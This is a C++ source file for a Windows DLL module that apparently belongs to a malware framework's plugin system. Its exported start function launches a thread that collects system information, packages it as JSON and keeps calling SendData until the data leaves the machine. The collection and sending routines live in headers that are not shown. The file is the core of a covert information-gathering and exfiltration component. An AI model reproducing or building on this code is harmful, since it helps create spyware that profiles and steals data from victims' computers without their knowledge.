#include "global.hpp"
#include "core_interact.hpp"
#include "information.hpp"

extern "C"
{
	__declspec(dllexport) DWORD WINAPI sm(module_data::msys_context *ctx);
}

DWORD WINAPI MainThread(LPVOID lpParameter)
{
	UNREFERENCED_PARAMETER(lpParameter);

	blob bDataJson;
	RtlSecureZeroMemory(&bDataJson, sizeof(bDataJson));

	IInformation *gatherer = nullptr;
	do
	{
		gatherer = (IInformation*)new DefaultInformationGather;
		if (gatherer == nullptr)
			break;

		if (!gatherer->collect())
			break;

		if (!gatherer->create_json(&bDataJson))
			break;

		BOOL bSent = FALSE;
		do
		{
			bSent = SendData(&bDataJson, nullptr);
		} while (bSent == FALSE);

	} while (FALSE);

	if (gatherer != nullptr)
		delete gatherer;

	if (bDataJson.lpBuffer != nullptr)
		delete[]bDataJson.lpBuffer;

	ExitThread(0);
}

__declspec(dllexport) DWORD WINAPI sm(module_data::msys_context *ctx)
{
	if (ctx == nullptr)
	{
#ifdef _DEBUG
		WriteLog(L"[sm] invalid ctx pointer");
#endif
		return ERROR_INVALID_PARAMETER;
	}

	global_data::ctx = ctx;

#ifdef _DEBUG
	WriteLog(L"[sm] entered into start module function");
#endif

	HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)MainThread, NULL, NULL, NULL);
	if (hThread)
		CloseHandle(hThread);

	return ERROR_SUCCESS;
}


BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD fdwReason, LPVOID lpvReserved)
{
	if (fdwReason == DLL_PROCESS_ATTACH)
	{
#ifdef _DEBUG
		WriteLog(L"[DllMain] DLL_PROCESS_ATTACH");
#endif
	}

	return TRUE;
}